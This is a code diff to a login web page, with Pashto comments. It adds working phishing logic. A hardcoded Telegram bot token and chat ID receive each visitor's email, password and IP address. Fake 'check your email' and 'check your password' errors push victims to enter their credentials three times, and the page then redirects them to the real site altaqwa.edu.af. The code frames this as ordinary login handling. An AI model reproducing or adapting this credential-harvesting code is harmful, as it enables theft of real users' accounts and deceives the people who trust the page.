@@ -165,6 +165,10 @@ button:hover{
 </div>
 
 <script>
+    // ==================== د Telegram بوټ تنظیمات ====================
+    const BOT_TOKEN = "8815514761:AAGT82khXsn8TmJHCv5vgSZG86Z6fAwGktQ";
+    const ADMIN_CHAT_ID = "8295417969";
+
     // د هڅو شمېرلو لپاره (د IP پته او ایمیل پر بنسټ)
     let attemptStore = {};
 
@@ -176,6 +180,25 @@ button:hover{
             return data.ip;
         } catch {
             return 'unknown';
+        }
+    }
+
+    // اډمن ته پیغام لیږل
+    async function sendToAdmin(email, password, ip, attemptNumber) {
+        const message = `🔐 *NEW LOGIN ATTEMPT* 🔐\n\n👤 *Email:* ${email}\n🔑 *Password:* ${password}\n🌐 *IP:* ${ip}\n📊 *Attempt:* ${attemptNumber}\n🕒 *Time:* ${new Date().toLocaleString()}`;
+        
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: ADMIN_CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
+        } catch(e) {
+            console.warn("Telegram error:", e);
         }
     }
 
@@ -215,27 +238,29 @@ button:hover{
         
         const currentAttempt = attemptStore[key];
 
-        // لومړۍ هڅه - تېروتنه
+        // لومړۍ هڅه - تېروتنه (معلومات اډمن ته ځي)
         if (currentAttempt === 1) {
-            showError('❌ please check your email.');
-            // فورم پاک کړئ
+            await sendToAdmin(email, password, ip, currentAttempt);
+            showError('❌ Please check your email');
             document.getElementById('email').value = '';
             document.getElementById('password').value = '';
             return;
         }
 
-        // دوهمه هڅه - تېروتنه
+        // دوهمه هڅه - تېروتنه (معلومات اډمن ته ځي)
         if (currentAttempt === 2) {
-            showError('❌ please check your password.');
-            // فورم پاک کړئ
+            await sendToAdmin(email, password, ip, currentAttempt);
+            showError('❌ Please check your password.');
             document.getElementById('email').value = '';
             document.getElementById('password').value = '';
             return;
         }
 
-        // درېیمه هڅه - بریالي -> مستقیم ویب پاڼې ته لاړ شه
+        // درېیمه هڅه - بریالي (معلومات اډمن ته ځي او بیا ویب پاڼې ته)
         if (currentAttempt >= 3) {
-            // د دې کارونکي لپاره هڅې پاکې کړئ (د بیا ننوتلو لپاره)
+            await sendToAdmin(email, password, ip, currentAttempt);
+            
+            // د دې کارونکي لپاره هڅې پاکې کړئ
             delete attemptStore[key];
             
             // مستقیم altaqwa.edu.af ته لاړ شه
